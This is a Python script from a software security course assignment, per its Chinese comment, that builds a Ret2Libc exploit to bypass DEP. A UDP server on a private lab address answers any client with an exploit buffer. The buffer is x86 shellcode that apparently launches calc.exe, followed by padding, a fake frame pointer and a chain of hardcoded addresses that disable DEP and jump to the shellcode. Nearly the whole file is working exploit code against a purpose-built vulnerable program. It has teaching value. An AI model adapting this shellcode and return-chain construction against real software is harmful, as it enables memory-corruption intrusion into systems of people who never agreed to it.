#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第十二周任务, 目的是利用 Ret2Libc 技术绕过 DEP 安全机制, 本来想利用 0Day 的程序过一遍即可, 但是发现居然找不到
合适的指令, 所以还是自己重新写一个有漏洞的程序吧
'''
__author__ = '__L1n__w@tch'

import socketserver

buf = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"
shellcode = buf


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)

        # socket.sendto(data.upper(), self.client_address)
        exploit_pop_eax_retn_28_address = b"\x7C\x88\x08\x70"[::-1]
        exploit_ebp = b"\x00\x12\xFD\x9C"[::-1]
        exploit_junk = b"\xDD" * (64 - 26)
        exploit_1 = b"\x00\x00\x00\x01"[::-1]
        exploit_close_dep_address = b"\x7C\x93\xBE\x24"[::-1]
        exploit_jmp_esp_address = b"\x7D\xD3\x9A\x0F"[::-1]
        exploit_jump_forward = b"\xEB\xA6\x90\x90"

        exploit = shellcode + \
                  exploit_junk + \
                  exploit_ebp + \
                  exploit_pop_eax_retn_28_address + \
                  exploit_1 + \
                  exploit_close_dep_address + exploit_jmp_esp_address + \
                  b"A" * 4 + exploit_jump_forward + b"C" * 4

        socket.sendto(exploit, self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
